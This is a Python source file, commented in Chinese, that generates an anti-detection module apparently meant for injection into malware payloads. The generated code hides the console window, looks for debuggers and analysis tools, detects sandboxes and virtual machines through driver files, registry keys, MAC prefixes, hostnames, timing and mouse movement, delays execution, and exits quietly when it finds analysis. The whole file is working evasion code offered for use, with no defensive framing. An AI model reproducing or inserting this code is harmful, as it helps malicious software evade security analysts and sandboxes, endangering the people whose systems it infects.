# -*- coding: utf-8 -*-
"""
反检测模块
提供反调试、反沙箱等功能
"""
import os
import sys
import time
import random
import platform
import subprocess
import threading
import datetime
from datetime import datetime


def create_advanced_evasion_code():
    """创建高级反检测代码"""
    evasion_code = '''
import os
import sys
import time
import random
import platform
import subprocess
import threading
import ctypes
from datetime import datetime

# 隐藏控制台窗口 (Windows)
def hide_console():
    """隐藏控制台窗口"""
    if platform.system() == "Windows":
        try:
            import ctypes
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd != 0:
                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
        except:
            pass

# 反调试检测
def anti_debug_checks():
    """多重反调试检测"""
    try:
        # 检测调试器进程
        debug_processes = [
            'ollydbg.exe', 'ProcessHacker.exe', 'tcpview.exe', 'autoruns.exe',
            'autorunsc.exe', 'filemon.exe', 'procmon.exe', 'regmon.exe',
            'procexp.exe', 'idaq.exe', 'idaq64.exe', 'ImmunityDebugger.exe',
            'Wireshark.exe', 'dumpcap.exe', 'HookExplorer.exe', 'ImportREC.exe',
            'PETools.exe', 'LordPE.exe', 'SysInspector.exe', 'proc_analyzer.exe',
            'sysAnalyzer.exe', 'sniff_hit.exe', 'winAPIoverride.exe',
            'apimonitor.exe', 'x32dbg.exe', 'x64dbg.exe', 'windbg.exe',
            'gdb.exe', 'python.exe', 'pythonw.exe'
        ]
        
        if platform.system() == "Windows":
            try:
                output = subprocess.check_output('tasklist', shell=True, 
                                               stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
                for proc in debug_processes:
                    if proc.lower() in output.lower():
                        return False
            except:
                pass
        else:
            try:
                output = subprocess.check_output(['ps', 'aux'], 
                                               stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
                for proc in debug_processes:
                    if proc.lower() in output.lower():
                        return False
            except:
                pass
        
        # 检测Python调试模式
        if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
            return False
            
        # 检测断点
        if sys.settrace is not None:
            return False
            
        return True
    except:
        return True

# 高级沙箱检测
def advanced_sandbox_detection():
    """高级沙箱环境检测"""
    try:
        # 1. 时间检测 - 检测时间加速
        start_time = time.time()
        time.sleep(1.5)
        elapsed = time.time() - start_time
        if elapsed < 1.2:  # 时间被加速
            return False
        
        # 2. 系统资源检测
        if platform.system() == "Windows":
            try:
                # 检测内存大小
                import psutil
                memory = psutil.virtual_memory().total / (1024**3)  # GB
                if memory < 2:  # 内存小于2GB
                    return False
                    
                # 检测CPU核心数
                cpu_count = psutil.cpu_count()
                if cpu_count < 2:
                    return False
                    
                # 检测硬盘大小
                disk = psutil.disk_usage('C:')
                disk_size = disk.total / (1024**3)  # GB
                if disk_size < 50:  # 硬盘小于50GB
                    return False
            except:
                pass
        
        # 3. 虚拟机特征检测
        vm_artifacts = [
            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\Vmmouse.sys',
            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\vm3dgl.dll',
            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\vmdum.dll',
            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\vm3dver.dll',
            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\vmtray.dll',
            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\VMToolsHook.dll',
            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\vmmousever.dll',
            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\vmhgfs.dll',
            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\vmGuestLib.dll'
        ]
        
        for artifact in vm_artifacts:
            if os.path.exists(artifact):
                return False
        
        # 4. 注册表检测 (Windows)
        if platform.system() == "Windows":
            try:
                import winreg
                vm_keys = [
                    (winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\\\CurrentControlSet\\\\Enum\\\\SCSI\\\\Disk&Ven_VMware_"),
                    (winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\\\CurrentControlSet\\\\Control\\\\CriticalDeviceDatabase\\\\root#vmwvmcihostdev"),
                    (winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\\\VMware, Inc.\\\\VMware Tools")
                ]
                
                for hkey, key_path in vm_keys:
                    try:
                        winreg.OpenKey(hkey, key_path)
                        return False
                    except:
                        continue
            except:
                pass
        
        # 5. 主机名检测
        hostname = platform.node().lower()
        vm_hostnames = ['sandbox', 'malware', 'virus', 'test', 'analysis', 
                       'vmware', 'virtualbox', 'vbox', 'qemu', 'xen']
        for vm_name in vm_hostnames:
            if vm_name in hostname:
                return False
        
        # 6. MAC地址检测
        try:
            import uuid
            mac = hex(uuid.getnode())[2:].upper()
            vm_macs = [
                '000569',  # VMware
                '000C29',  # VMware
                '001C14',  # VMware
                '005056',  # VMware
                '0A0027',  # VirtualBox
                '080027'   # VirtualBox
            ]
            for vm_mac in vm_macs:
                if mac.startswith(vm_mac):
                    return False
        except:
            pass
        
        # 7. 网络连接检测
        try:
            import socket
            test_sites = ['google.com', 'microsoft.com', 'github.com']
            for site in test_sites:
                try:
                    socket.create_connection((site, 80), timeout=3)
                    break
                except:
                    continue
            else:
                return False  # 无法连接任何网站
        except:
            pass
        
        # 8. 鼠标移动检测 (Windows)
        if platform.system() == "Windows":
            try:
                import win32gui
                pos1 = win32gui.GetCursorPos()
                time.sleep(2)
                pos2 = win32gui.GetCursorPos()
                if pos1 == pos2:  # 鼠标没有移动
                    return False
            except:
                pass
        
        return True
    except:
        return True

# 反分析延迟
def analysis_delay(delay_seconds=30):
    """反分析延迟执行"""
    try:
        # 多种延迟方式混合使用
        delay_methods = [
            lambda: time.sleep(delay_seconds / 3),
            lambda: [i for i in range(1000000)],  # CPU密集型操作
            lambda: time.sleep(delay_seconds / 3),
        ]
        
        for method in delay_methods:
            method()
            
        # 随机额外延迟
        time.sleep(random.uniform(1, delay_seconds / 6))
        
    except:
        time.sleep(delay_seconds)

# 环境检查主函数
def comprehensive_environment_check(silent_delay=30):
    """综合环境检查"""
    try:
        # 隐藏控制台
        hide_console()
        
        # 初始延迟
        analysis_delay(silent_delay)
        
        # 反调试检测
        if not anti_debug_checks():
            # 执行无害操作并退出
            time.sleep(random.uniform(10, 30))
            sys.exit(0)
        
        # 沙箱检测
        if not advanced_sandbox_detection():
            # 执行无害操作并退出
            time.sleep(random.uniform(10, 30))
            sys.exit(0)
        
        return True
    except:
        return False
'''
    return evasion_code
